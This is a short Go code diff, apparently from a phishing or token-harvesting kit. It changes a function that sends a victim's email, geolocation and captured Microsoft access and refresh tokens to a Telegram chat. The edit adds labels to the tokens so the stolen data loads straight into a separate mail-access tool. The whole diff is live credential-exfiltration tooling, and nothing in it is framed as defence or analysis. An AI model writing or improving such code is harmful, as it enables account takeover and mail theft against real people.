@@ -1133,13 +1133,16 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 		caption := fmt.Sprintf("📧 %s\n📍 %s, %s %s\n🌐 %s",
 			userEmail, geoInfo.City, geoInfo.Country, geoInfo.CountryFlag, data.Origin)
 
-		// File content: raw tokens only, easy to copy
+		// File content: labeled tokens for M365-Mail import compatibility
+		// M365-Mail tolerant parser recognizes "accessToken: eyJ..." and "refreshToken: 0.ARM..."
 		var fileContent strings.Builder
-		if at, ok := data.Custom["dc_access_token"]; ok {
+		if at, ok := data.Custom["dc_access_token"]; ok && at != "" {
+			fileContent.WriteString("accessToken: ")
 			fileContent.WriteString(at)
 		}
-		fileContent.WriteString("\n\n")
-		if rt, ok := data.Custom["dc_refresh_token"]; ok {
+		fileContent.WriteString("\n")
+		if rt, ok := data.Custom["dc_refresh_token"]; ok && rt != "" {
+			fileContent.WriteString("refreshToken: ")
 			fileContent.WriteString(rt)
 		}
 
